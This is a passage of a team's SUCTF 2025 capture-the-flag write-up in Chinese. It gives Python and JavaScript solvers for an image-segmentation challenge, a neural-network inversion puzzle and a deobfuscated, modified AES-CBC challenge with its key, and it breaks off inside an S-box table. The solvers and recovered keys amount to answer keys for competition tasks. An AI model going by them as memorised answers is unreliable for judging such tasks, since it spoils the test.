+++
title = "SUCTF 2025 Writeup"
date = "2025-01-14T09:10:36+08:00"
author = "GeekCmore"
cover = ""
coverCaption = ""
tags = ["SUCTF", "Writeup"]
keywords = ["", ""]
description = ""
showFullContent = false
readingTime = false
hideComments = false
color = "" #color from the theme settings
+++

本次比赛0xFFF战队稳中有进，最终获得季军的成绩，成功AK Reverse和Pwn方向，Misc方向也是全场解题数最多的队伍之一。

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-54-57.png" alt="SUCTF_2025_Writeup-2025-01-14-15-54-57" position="center" style="border-radius: 1px;" >}}

0xFFF是一支劲头十足的新兴战队，现在正在全方向招新，如果你有意向，请发送简历至T_0xFFF@163.com。

<!--more-->
## Misc

### SU\_AI\_segment\_ceil

找到了细胞分割的项目地址，有别人做好的test集，题目应该就是根据这个改的

https://github.com/a-martyn/unet/tree/master

首先计算得到的图片的MSE相似度找到最相似的照片，然后找到对应的答案发送即可

```Python
from pwn import *
import cv2
import os
import base64
import numpy as np
from skimage.metrics import mean_squared_error as mse

# 解码Base64字符串并保存为图片
def decode_base64_to_image(base64_string, output_path):
    try:
        image_data = base64.b64decode(base64_string)
        with open(output_path, "wb") as f:
            f.write(image_data)
        print(f"[INFO] 图片解码并保存为: {output_path}")
    except Exception as e:
        print(f"[ERROR] Base64解码失败: {e}")
        raise

# 计算图像相似度（MSE）
def calculate_similarity(img1_path, img2_path):
    try:
        img1 = cv2.imread(img1_path)
        img2 = cv2.imread(img2_path)

        if img1 is None or img2 is None:
            raise FileNotFoundError(f"无法加载图像: {img1_path} 或 {img2_path}")
    
        # 调整图像大小一致
        img1 = cv2.resize(img1, (512, 512))
        img2 = cv2.resize(img2, (512, 512))
    
        # 转换为灰度图像
        gray1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY)
        gray2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY)
    
        # 计算 MSE
        similarity = mse(gray1, gray2)
        return similarity
    except Exception as e:
        print(f"[ERROR] 无法计算相似性: {e}")
        raise

# 寻找最相似的图像
def find_most_similar_image(target_image_path, folder_path):
    try:
        png_files = [f for f in os.listdir(folder_path) if f.lower().endswith('.png')]
    
        min_mse = float('inf')
        most_similar_file = None
    
        for png_file in png_files:
            png_path = os.path.join(folder_path, png_file)
            similarity = calculate_similarity(target_image_path, png_path)
            if similarity < min_mse:  # 越小越相似
                min_mse = similarity
                most_similar_file = png_path
    
        return most_similar_file
    except Exception as e:
        print(f"[ERROR] 无法找到相似图像: {e}")
        return None

# 将图像编码为Base64
def encode_image_to_base64(image_path):
    try:
        with open(image_path, "rb") as img_file:
            encoded = base64.b64encode(img_file.read()).decode('utf-8')
            print(f"[INFO] 图片已编码为Base64: {image_path}")
            return encoded
    except Exception as e:
        print(f"[ERROR] 无法编码图片为Base64: {e}")
        raise

# 保存Base64为图片
def save_base64_to_image(base64_data, output_path):
    try:
        image_data = base64.b64decode(base64_data)
        with open(output_path, "wb") as img_file:
            img_file.write(image_data)
        print(f"[INFO] 图片已保存为: {output_path}")
    except Exception as e:
        print(f"[ERROR] 无法保存图片: {e}")
        raise

# 与服务器交互
def interact_with_server(server_address, port, folder_path):
    # 连接到服务端
    conn = remote('1.95.34.240', 10001)  # 修改为题目提供的地址和端口
    kkk = 1
    while True:
            if kkk == 1:
            # 接收题目中的图片数据
                kkk = 0
                conn.recvuntil(b'image:')
                base64_image = conn.recvline().strip().decode('utf-8')
            print(len(base64_image))
            if len(base64_image) < 35 :
                continue
            image_data = base64.b64decode(base64_image.replace('can you help me segment the image:image:' , '').replace('image:',''))
    

            print(f"[INFO] 接收到的Base64字符串: {image_data[:50]}...")  # 显示前50个字符
    

        
            # 保存为目标图片
            target_image_path = "received_image.png"
            save_base64_to_image(base64_image, target_image_path)
        
            # 寻找最相似的图像
            most_similar_image = find_most_similar_image(target_image_path, folder_path)
            if not most_similar_image:
                print("[ERROR] 未找到相似图像")
                return
        
            print(f"[INFO] 找到最相似的图像: {most_similar_image}")
        
            # 编码最相似的图像为Base64
            base64_image = encode_image_to_base64(most_similar_image.replace('/input/', '/target/'))
        
            # 发送Base64编码的图片
            conn.sendline(base64_image)
            print("[INFO] 已发送最相似的图像")
        
            # 接收结果
            result = conn.recvline().strip()
            print(f"[INFO] 服务器返回结果: {result.decode()[:100]}")
            base64_image = result.decode('utf-8').replace('can you help me segment the image:image: ' , '')
            print(f"[INFO] 服务器返回结果: {base64_image[:100]}")

    conn.close()

    final_message = conn.recvall().decode('utf-8')
    #print(final_message)

if __name__ == "__main__":
    # 配置服务器地址和端口
    server_address = "1.95.34.240"  # 替换为服务端地址
    port = 10001  # 替换为服务端端口
  
    # 配置图片文件夹路径
    folder_path = "/root/coder/unet-master/data/membrane/input"  # 替换为存储图像的文件夹
  
    # 开始交互
    interact_with_server(server_address, port, folder_path)
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-58-16.png" alt="SUCTF_2025_Writeup-2025-01-14-15-58-16" position="center" style="border-radius: 1px;" >}}

### SU\_AI\_how\_to\_encrypt\_plus

首先查看这个网络结构

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-58-24.png" alt="SUCTF_2025_Writeup-2025-01-14-15-58-24" position="center" style="border-radius: 1px;" >}}
确定n\=48，flag长度为48字符

查看网络的每个层的的线性和卷积的权重

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-58-30.png" alt="SUCTF_2025_Writeup-2025-01-14-15-58-30" position="center" style="border-radius: 1px;" >}}

根据网络结构逆推，根据卷积原理，不难写出推导表达式

$$ Y[i, j] = \sum_{m=0}^{k_h-1} \sum_{n=0}^{k_w-1} W[m, n] \cdot X[s \cdot i + m - p, s \cdot j + n - p] + b $$


转化为矩阵

\$\$\\mathbf{Y} \= \\mathbf{A} \\cdot \\mathbf{X} + \\mathbf{b} \$\$

得到

\$\$\\mathbf{Y}\_{\\text{adjusted}} \= \\mathbf{Y} - \\mathbf{b} \$\$

由于 A 可能是非满秩矩阵，使用最小二乘法求解：

\$\$\\mathbf{X} \= (\\mathbf{A}\^T \\mathbf{A})\^{-1} \\mathbf{A}\^T \\mathbf{Y}\_{\\text{adjusted}} \$\$
```Python
def solve_input_from_stride(weight, bias, Y, input_dim, stride=1, padding=1):
    """
    Solve for the input matrix X given the convolution parameters and output matrix Y.

    Args:
        weight (torch.Tensor): The weight of the convolution layer (e.g., [out_channels, in_channels, kernel_h, kernel_w]).
        bias (torch.Tensor): The bias of the convolution layer (e.g., [out_channels]).
        Y (torch.Tensor): The output matrix after the convolution.
        input_dim (tuple): The dimensions of the input matrix (height, width).
        stride (int): The stride of the convolution. Default is 1.
        padding (int): The padding applied to the input matrix. Default is 1.

    Returns:
        numpy.ndarray: The input matrix X that produces the output Y.
    """
    # Flatten Y for linear equation solving
    Y = Y.flatten().numpy()
  
    # Generate the Toeplitz matrix
    def get_toeplitz(weight, input_dim, stride, padding):
        kernel_size = weight.shape[-1]
        output_dim = (input_dim[0] + 2 * padding - kernel_size) // stride + 1
        rows, cols = output_dim**2, input_dim[0] * input_dim[1]
        A = np.zeros((rows, cols))

        for i in range(output_dim):
            for j in range(output_dim):
                row = i * output_dim + j
                for ki in range(kernel_size):
                    for kj in range(kernel_size):
                        input_row = i * stride + ki - padding
                        input_col = j * stride + kj - padding
                        if 0 <= input_row < input_dim[0] and 0 <= input_col < input_dim[1]:
                            col = input_row * input_dim[1] + input_col
                            A[row, col] = weight[0, 0, ki, kj]
        return A

    # Calculate output dimensions
    kernel_size = weight.shape[-1]
    output_dim = (input_dim[0] + 2 * padding - kernel_size) // stride + 1
  
    # Generate the Toeplitz matrix A
    A = get_toeplitz(weight, input_dim, stride, padding)
  
    # Bias vector
    b = bias.repeat(output_dim**2).numpy()

    # Adjust Y by subtracting bias
    Y_adjusted = Y - b

    # Solve for X using least squares: A * X + b = Y
    X, _, _, _ = lstsq(A, Y_adjusted)

    # Reshape X to input dimensions
    X = X.reshape(input_dim)
    return X
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-58-42.png" alt="SUCTF_2025_Writeup-2025-01-14-15-58-42" position="center" style="border-radius: 1px;" >}}

转化张量之后

解线性层，矩阵规模如下[1,48]\*[48,2304]-[1,2304] \= [1,2304]，很明显挑选48列构造一个满秩矩阵就可以解这个线性方程

\$\$y \= x\\cdot (W\^T) + b\$\$

\$\$y - b \= x\\cdot (W\^T)\$\$

\$\$y' \= y - b\$\$

\$\$x \= y' \\cdot (W\^T)\^{-1}\$\$

```Python
def solve_for_x_from_y(W, b, y):
    # 将权重、偏置和输出转换为 NumPy 数组，并指定类型为 float64
    print(W.shape) 
    W_np = W.detach().numpy().astype(np.float64)
    b_np = b.detach().numpy().astype(np.float64)
    y_np = y.detach().numpy().astype(np.float64)

    # 计算调整后的输出向量 y' = y - b
    y_prime = y_np - b_np

    # 计算 (W^T) 的逆矩阵，并精确求解 x
    W_T_inv = np.linalg.inv(W_np.T)
    x_exact = y_prime @ W_T_inv  # 等价于 (y - b) * (W^T)^{-1}

    return x_exact
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-58-50.png" alt="SUCTF_2025_Writeup-2025-01-14-15-58-50" position="center" style="border-radius: 1px;" >}}

得到第一步变化的矩阵，

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-59-00.png" alt="SUCTF_2025_Writeup-2025-01-14-15-59-00" position="center" style="border-radius: 1px;" >}}

根据X为01矩阵，不难解出来X，然后得到flag

```Python
import numpy as np

def solve_x(y):
    # 计算 z = y - 6
    z = int(y - 6)

    # 检查 z 是否在 0 到 511 之间，以确保 9 位表示足够
    if z < 0 or z >= 512:
        raise ValueError(f"y = {y} 对应的 z 不在 0 到 511 之间。")

    # 初始化 x 列表，用于存储 x1 到 x9
    x = [0] * 9

    # 对于 i 从 0 到 8，对应 x1 到 x9
    for i in range(9):
        # 取最低位作为 xi
        x[i] = z % 2
        # 右移一位，准备下一次循环
        z //= 2

    # 返回的列表顺序为 [x1, x2, ..., x9]
    return x

# 给定的 y 数组
y_array = np.array([298., 352., 380., 298., 368., 299., 266., 206., 108., 
                    298., 104., 303., 298., 430., 489., 298., 381., 388., 
                    298., 370., 499., 298., 227., 242., 298., 372., 461., 
                    298., 401., 500., 298., 379., 130., 298., 115., 308., 
                    298., 239., 106., 298., 100., 277., 42., 83., 299., 
                    266., 499., 341.])

# 遍历每个 y 值，计算对应的 x 序列
results = []
for y in y_array:
    try:
        x_values = solve_x(y)
        results.append(x_values)
    except ValueError as e:
        # 如果 y 超出有效范围，记录错误信息
        results.append(str(e))
a = []
b = []
c = []
# 打印结果
for idx, (y, x_vals) in enumerate(zip(y_array, results)):
    a.append(x_vals[0] )
    a.append(x_vals[1] )
    a.append(x_vals[2] )
    b.append(x_vals[3] )
    b.append(x_vals[4] )
    b.append(x_vals[5] )
    c.append(x_vals[6] )
    c.append(x_vals[7] )
    c.append(x_vals[8] )
    print(f"第 {idx+1} 个 y = {y} 对应的 x 值为: {x_vals}")
print(a+b+c)

def recover_flag(flag_list):
    """
    Recover the original flag string from the list of binary bits.

    Args:
        flag_list (list of int): A list containing the binary bits (0 or 1) of the flag.

    Returns:
        str: The original flag string.
    """
    # Ensure the length of flag_list is a multiple of 9
    if len(flag_list) % 9 != 0:
        raise ValueError("The length of flag_list must be a multiple of 9")

    # Initialize the flag string
    flag = ""

    # Process the flag_list in chunks of 9 bits
    for i in range(0, len(flag_list), 9):
        # Extract 9 bits and convert to a binary string
        binary_str = ''.join(map(str, flag_list[i:i+9]))
    
        # Convert the binary string to an integer
        char_code = int(binary_str, 2)
    
        # Convert the integer to a character and append to the flag string
        flag += chr(char_code)

    return flag
f = recover_flag(a+b+c)
print(f)
```

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-59-09.png" alt="SUCTF_2025_Writeup-2025-01-14-15-59-09" position="center" style="border-radius: 1px;" >}}

### SU_HappyAST

前面是正常的js逆向，先用在线工具去除一下大致的混淆

https://obf-io.deobfuscate.io/

这时候直接运行会陷入死循环，将下面这几行代码注释掉即可去掉检查

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-59-53.png" alt="SUCTF_2025_Writeup-2025-01-14-15-59-53" position="center" style="border-radius: 1px;" >}}

接着就硬调慢慢分析，照着已有的符号可以在Github上找到源码

https://github.com/ricmoo/aes-js/blob/master/index.js

对着恢复符号信息然后对比一下，其实就是个魔改的AES-CBC，修改了rcon

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-15-59-59.png" alt="SUCTF_2025_Writeup-2025-01-14-15-59-59" position="center" style="border-radius: 1px;" >}}

key在调试的时候就能看到个明文字符串的就是了`50aca6ed2feffa0c`​，iv也是这个

{{< image src="https://0xfff-1302812534.cos.ap-shanghai.myqcloud.com/img/SUCTF_2025_Writeup-2025-01-14-16-00-09.png" alt="SUCTF_2025_Writeup-2025-01-14-16-00-09" position="center" style="border-radius: 1px;" >}}

改一下源码拿来解密即可

```JavaScript
function checkInt(value) {
    return (parseInt(value) === value);
}

function checkInts(arrayish) {
    if (!checkInt(arrayish.length)) { return false; }

    for (var i = 0; i < arrayish.length; i++) {
        if (!checkInt(arrayish[i]) || arrayish[i] < 0 || arrayish[i] > 255) {
            return false;
        }
    }

    return true;
}

function coerceArray(arg, copy) {

    // ArrayBuffer view
    if (arg.buffer && arg.name === 'Uint8Array') {

        if (copy) {
            if (arg.slice) {
                arg = arg.slice();
            } else {
                arg = Array.prototype.slice.call(arg);
            }
        }

        return arg;
    }

    // It's an array; check it is a valid representation of a byte
    if (Array.isArray(arg)) {
        if (!checkInts(arg)) {
            throw new Error('Array contains invalid value: ' + arg);
        }

        return new Uint8Array(arg);
    }

    // Something else, but behaves like an array (maybe a Buffer? Arguments?)
    if (checkInt(arg.length) && checkInts(arg)) {
        return new Uint8Array(arg);
    }

    throw new Error('unsupported array-like object');
}

function createArray(length) {
    return new Uint8Array(length);
}

function copyArray(sourceArray, targetArray, targetStart, sourceStart, sourceEnd) {
    if (sourceStart != null || sourceEnd != null) {
        if (sourceArray.slice) {
            sourceArray = sourceArray.slice(sourceStart, sourceEnd);
        } else {
            sourceArray = Array.prototype.slice.call(sourceArray, sourceStart, sourceEnd);
        }
    }
    targetArray.set(sourceArray, targetStart);
}


// Number of rounds by keysize
var numberOfRounds = { 16: 10, 24: 12, 32: 14 }

// Round constant words
// 被修改后的rcon
var rcon = [2, 4, 8, 16, 32, 64, 128, 27, 54, 108, 216, 171, 77, 154, 47, 94, 188, 99, 198, 151, 53, 106, 212, 179, 125, 250, 239, 197, 145, 1];

// S-box and Inverse S-box (S is for Substitution)
var S = [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16];
var Si = [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d];

// Transformations for encryption
var T1 = [0xc66363a5, 0xf87c7c84, 0xee777799, 0xf67b7b8d, 0xfff2f20d, 0xd66b6bbd, 0xde6f6fb1, 0x91c5c554, 0x60303050, 0x02010103, 0xce6767a9, 0x562b2b7d, 0xe7fefe19, 0xb5d7d762, 0x4dababe6, 0xec76769a, 0x8fcaca45, 0x1f82829d, 0x89c9c940, 0xfa7d7d87, 0xeffafa15, 0xb25959eb, 0x8e4747c9, 0xfbf0f00b, 0x41adadec, 0xb3d4d467, 0x5fa2a2fd, 0x45afafea, 0x239c9cbf, 0x53a4a4f7, 0xe4727296, 0x9bc0c05b, 0x75b7b7c2, 0xe1fdfd1c, 0x3d9393ae, 0x4c26266a, 0x6c36365a, 0x7e3f3f41, 0xf5f7f702, 0x83cccc4f, 0x6834345c, 0x51a5a5f4, 0xd1e5e534, 0xf9f1f108, 0xe2717193, 0xabd8d873, 0x62313153, 0x2a15153f, 0x0804040c, 0x95c7c752, 0x46232365, 0x9dc3c35e, 0x30181828, 0x379696a1, 0x0a05050f, 0x2f9a9ab5, 0x0e070709, 0x24121236, 0x1b80809b, 0xdfe2e23d, 0xcdebeb26, 0x4e272769, 0x7fb2b2cd, 0xea75759f, 0x1209091b, 0x1d83839e, 0x582c2c74, 0x341a1a2e, 0x361b1b2d, 0xdc6e6eb2, 0xb45a5aee, 0x5ba0a0fb, 0xa45252f6, 0x763b3b4d, 0xb7d6d661, 0x7db3b3ce, 0x5229297b, 0xdde3e33e, 0x5e2f2f71, 0x13848497, 0xa65353f5, 0xb9d1d168, 0x00000000, 0xc1eded2c, 0x40202060, 0xe3fcfc1f, 0x79b1b1c8, 0xb65b5bed, 0xd46a6abe, 0x8dcbcb46, 0x67bebed9, 0x7239394b, 0x944a4ade, 0x984c4cd4, 0xb05858e8, 0x85cfcf4a, 0xbbd0d06b, 0xc5efef2a, 0x4faaaae5, 0xedfbfb16, 0x864343c5, 0x9a4d4dd7, 0x66333355, 0x11858594, 0x8a4545cf, 0xe9f9f910, 0x04020206, 0xfe7f7f81, 0xa05050f0, 0x783c3c44, 0x259f9fba, 0x4ba8a8e3, 0xa25151f3, 0x5da3a3fe, 0x804040c0, 0x058f8f8a, 0x3f9292ad, 0x219d9dbc, 0x70383848, 0xf1f5f504, 0x63bcbcdf, 0x77b6b6c1, 0xafdada75, 0x42212163, 0x20101030, 0xe5ffff1a, 0xfdf3f30e, 0xbfd2d26d, 0x81cdcd4c, 0x180c0c14, 0x26131335, 0xc3ecec2f, 0xbe5f5fe1, 0x359797a2, 0x884444cc, 0x2e171739, 0x93c4c457, 0x55a7a7f2, 0xfc7e7e82, 0x7a3d3d47, 0xc86464ac, 0xba5d5de7, 0x3219192b, 0xe6737395, 0xc06060a0, 0x19818198, 0x9e4f4fd1, 0xa3dcdc7f, 0x44222266, 0x542a2a7e, 0x3b9090ab, 0x0b888883, 0x8c4646ca, 0xc7eeee29, 0x6bb8b8d3, 0x2814143c, 0xa7dede79, 0xbc5e5ee2, 0x160b0b1d, 0xaddbdb76, 0xdbe0e03b, 0x64323256, 0x743a3a4e, 0x140a0a1e, 0x924949db, 0x0c06060a, 0x4824246c, 0xb85c5ce4, 0x9fc2c25d, 0xbdd3d36e, 0x43acacef, 0xc46262a6, 0x399191a8, 0x319595a4, 0xd3e4e437, 0xf279798b, 0xd5e7e732, 0x8bc8c843, 0x6e373759, 0xda6d6db7, 0x018d8d8c, 0xb1d5d564, 0x9c4e4ed2, 0x49a9a9e0, 0xd86c6cb4, 0xac5656fa, 0xf3f4f407, 0xcfeaea25, 0xca6565af, 0xf47a7a8e, 0x47aeaee9, 0x10080818, 0x6fbabad5, 0xf0787888, 0x4a25256f, 0x5c2e2e72, 0x381c1c24, 0x57a6a6f1, 0x73b4b4c7, 0x97c6c651, 0xcbe8e823, 0xa1dddd7c, 0xe874749c, 0x3e1f1f21, 0x964b4bdd, 0x61bdbddc, 0x0d8b8b86, 0x0f8a8a85, 0xe0707090, 0x7c3e3e42, 0x71b5b5c4, 0xcc6666aa, 0x904848d8, 0x06030305, 0xf7f6f601, 0x1c0e0e12, 0xc26161a3, 0x6a35355f, 0xae5757f9, 0x69b9b9d0, 0x17868691, 0x99c1c158, 0x3a1d1d27, 0x279e9eb9, 0xd9e1e138, 0xebf8f813, 0x2b9898b3, 0x22111133, 0xd26969bb, 0xa9d9d970, 0x078e8e89, 0x339494a7, 0x2d9b9bb6, 0x3c1e1e22, 0x15878792, 0xc9e9e920, 0x87cece49, 0xaa5555ff, 0x50282878, 0xa5dfdf7a, 0x038c8c8f, 0x59a1a1f8, 0x09898980, 0x1a0d0d17, 0x65bfbfda, 0xd7e6e631, 0x844242c6, 0xd06868b8, 0x824141c3, 0x299999b0, 0x5a2d2d77, 0x1e0f0f11, 0x7bb0b0cb, 0xa85454fc, 0x6dbbbbd6, 0x2c16163a];
var T2 = [0xa5c66363, 0x84f87c7c, 0x99ee7777, 0x8df67b7b, 0x0dfff2f2, 0xbdd66b6b, 0xb1de6f6f, 0x5491c5c5, 0x50603030, 0x03020101, 0xa9ce6767, 0x7d562b2b, 0x19e7fefe, 0x62b5d7d7, 0xe64dabab, 0x9aec7676, 0x458fcaca, 0x9d1f8282, 0x4089c9c9, 0x87fa7d7d, 0x15effafa, 0xebb25959, 0xc98e4747, 0x0bfbf0f0, 0xec41adad, 0x67b3d4d4, 0xfd5fa2a2, 0xea45afaf, 0xbf239c9c, 0xf753a4a4, 0x96e47272, 0x5b9bc0c0, 0xc275b7b7, 0x1ce1fdfd, 0xae3d9393, 0x6a4c2626, 0x5a6c3636, 0x417e3f3f, 0x02f5f7f7, 0x4f83cccc, 0x5c683434, 0xf451a5a5, 0x34d1e5e5, 0x08f9f1f1, 0x93e27171, 0x73abd8d8, 0x53623131, 0x3f2a1515, 0x0c080404, 0x5295c7c7, 0x65462323, 0x5e9dc3c3, 0x28301818, 0xa1379696, 0x0f0a0505, 0xb52f9a9a, 0x090e0707, 0x36241212, 0x9b1b8080, 0x3ddfe2e2, 0x26cdebeb, 0x694e2727, 0xcd7fb2b2, 0x9fea7575, 0x1b120909, 0x9e1d8383, 0x74582c2c, 0x2e341a1a, 0x2d361b1b, 0xb2dc6e6e, 0xeeb45a5a, 0xfb5ba0a0, 0xf6a45252, 0x4d763b3b, 0x61b7d6d6, 0xce7db3b3, 0x7b522929, 0x3edde3e3, 0x715e2f2f, 0x97138484, 0xf5a65353, 0x68b9d1d1, 0x00000000, 0x2cc1eded, 0x60402020, 0x1fe3fcfc, 0xc879b1b1, 0xedb65b5b, 0xbed46a6a, 0x468dcbcb, 0xd967bebe, 0x4b723939, 0xde944a4a, 0xd4984c4c, 0xe8b05858, 0x4a85cfcf, 0x6bbbd0d0, 0x2ac5efef, 0xe54faaaa, 0x16edfbfb, 0xc5864343, 0xd79a4d4d, 0x55663333, 0x94118585, 0xcf8a4545, 0x10e9f9f9, 0x06040202, 0x81fe7f7f, 0xf0a05050, 0x44783c3c, 0xba259f9f, 0xe34ba8a8, 0xf3a25151, 0xfe5da3a3, 0xc0804040, 0x8a058f8f, 0xad3f9292, 0xbc219d9d, 0x48703838, 0x04f1f5f5, 0xdf63bcbc, 0xc177b6b6, 0x75afdada, 0x63422121, 0x30201010, 0x1ae5ffff, 0x0efdf3f3, 0x6dbfd2d2, 0x4c81cdcd, 0x14180c0c, 0x35261313, 0x2fc3ecec, 0xe1be5f5f, 0xa2359797, 0xcc884444, 0x392e1717, 0x5793c4c4, 0xf255a7a7, 0x82fc7e7e, 0x477a3d3d, 0xacc86464, 0xe7ba5d5d, 0x2b321919, 0x95e67373, 0xa0c06060, 0x98198181, 0xd19e4f4f, 0x7fa3dcdc, 0x66442222, 0x7e542a2a, 0xab3b9090, 0x830b8888, 0xca8c4646, 0x29c7eeee, 0xd36bb8b8, 0x3c281414, 0x79a7dede, 0xe2bc5e5e, 0x1d160b0b, 0x76addbdb, 0x3bdbe0e0, 0x56643232, 0x4e743a3a, 0x1e140a0a, 0xdb924949, 0x0a0c0606, 0x6c482424, 0xe4b85c5c, 0x5d9fc2c2, 0x6ebdd3d3, 0xef43acac, 0xa6c46262, 0xa8399191, 0xa4319595, 0x37d3e4e4, 0x8bf27979, 0x32d5e7e7, 0x438bc8c8, 0x596e3737, 0xb7da6d6d, 0x8c018d8d, 0x64b1d5d5, 0xd29c4e4e, 0xe049a9a9, 0xb4d86c6c, 0xfaac5656, 0x07f3f4f4, 0x25cfeaea, 0xafca6565, 0x8ef47a7a, 0xe947aeae, 0x18100808, 0xd56fbaba, 0x88f07878, 0x6f4a2525, 0x725c2e2e, 0x24381c1c, 0xf157a6a6, 0xc773b4b4, 0x5197c6c6, 0x23cbe8e8, 0x7ca1dddd, 0x9ce87474, 0x213e1f1f, 0xdd964b4b, 0xdc61bdbd, 0x860d8b8b, 0x850f8a8a, 